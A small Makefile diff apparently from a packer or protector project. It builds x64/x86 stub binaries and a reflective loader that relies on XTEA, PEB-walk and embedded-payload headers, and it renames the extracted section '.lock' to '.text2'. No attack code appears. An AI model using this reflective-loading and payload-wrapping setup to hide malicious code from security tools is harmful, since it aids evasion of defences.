@@ -175,7 +175,7 @@ $(STUB_EXE_X64): $(STUB_OBJ_X64) $(STUB_DIR)/stub.ld
 	$(GCC_X64) $(STUB_CFLAGS_X64) $(STUB_LDFLAGS_X64) $(STUB_OBJ_X64) -o $@
 
 $(STUB_BIN_X64): $(STUB_EXE_X64)
-	$(OBJCOPY) -O binary -j .lock $< $@
+	$(OBJCOPY) -O binary -j .text2 $< $@
 	@echo === stub_x64.bin layout ===
 	@$(NM) $< 2>/dev/null | grep -E "stub_entry|stub_data|STR_" | head -20 || true
 
@@ -188,7 +188,7 @@ $(STUB_EXE_X86): $(STUB_OBJ_X86) $(STUB_DIR)/stub.ld
 	$(GCC_X86) $(STUB_CFLAGS_X86) $(STUB_LDFLAGS_X86) $(STUB_OBJ_X86) -o $@
 
 $(STUB_BIN_X86): $(STUB_EXE_X86)
-	$(OBJCOPY) -O binary -j .lock $< $@
+	$(OBJCOPY) -O binary -j .text2 $< $@
 	@echo === stub_x86.bin layout ===
 	@$(NM) $< 2>/dev/null | grep -E "stub_entry|stub_data|STR_" | head -20 || true
 
@@ -198,7 +198,7 @@ $(BLD_EXE): $(BLD_SRC) $(COMMON_DIR)/config.h $(COMMON_DIR)/xtea.h
 
 # === 构建 reflective stub x64（loader_x64.exe） ===
 # 开发优先：用 CRT + console subsystem，printf 调试可见
-# MVP 阶段直接编 exe，不做 objcopy 提取 .lock 节
+# MVP 阶段直接编 exe，不做 objcopy 提取 .text2 节
 # 依赖 common/sha256.h（复用 SHA-256 实现）和 common/config.h（XTEA 参数）
 $(RFL_EXE_X64): $(RFL_SRC) $(RFL_DIR)/payload.h $(COMMON_DIR)/sha256.h $(COMMON_DIR)/config.h \
                 $(COMMON_DIR)/winlock_compat.h $(COMMON_DIR)/peb_walk.h $(COMMON_DIR)/xtea.h
